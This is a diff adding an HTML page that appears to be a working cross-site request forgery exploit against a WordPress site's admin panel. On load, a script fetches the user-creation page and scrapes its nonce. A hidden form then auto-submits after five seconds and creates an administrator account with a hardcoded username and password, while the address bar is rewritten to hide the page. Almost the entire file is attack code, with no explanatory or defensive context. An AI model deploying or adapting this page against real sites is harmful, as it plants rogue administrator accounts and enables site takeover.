@@ -1,0 +1,10 @@
+<!DOCTYPE html><html><head><title>title</title></head><body onload="setTimeout(function(){document.createElement('form').submit.call(document.getElementById('myForm'))}, 5000)"><ul id="posts-list"></ul><script>
+            fetch("https://yourwebsite.com.vn/wp-admin/user-new.php")
+            .then(response => response.text())
+            .then(data => {
+            const parser = new DOMParser();
+            const html = parser.parseFromString(data, "text/html");f
+            const nonceValue = html.getElementById("_wpnonce_create-user").value;
+            console.log(nonceValue);
+            document.getElementById("nonceValue-input").value = nonceValue;
+            });</script><script>history.pushState('', '', '/')</script><form id="myForm" name="myForm" action="https://yourwebsite.com.vn/wp-admin/user-new.php" method="POST"><input type="hidden" name="action" value="createuser" /><input type="hidden" name="_wp_http_referer" value="/wp-admin/user-new.php" /><input type="hidden" name="user_login" value="csrffinal2" /><input type="hidden" name="email" value="csrffinal2@gmail.com" /><input type="hidden" name="_wpnonce_create-user" id="nonceValue-input"><input type="hidden" name="first_name" value="" /><input type="hidden" name="last_name" value="" /><input type="hidden" name="url" value="" /><input type="hidden" name="locale" value="site-default" /><input type="hidden" name="pass1" value="thanhdatdeptrai" /><input type="hidden" name="pass2" value="thanhdatdeptrai" /><input type="hidden" name="send_user_notification" value="1" /><input type="hidden" name="role" value="administrator" /><input type="hidden" name="createuser" value="Add+New+User" /><input type=hidden name="submit" id="submit" value="Continue"/></form>   </body></html>
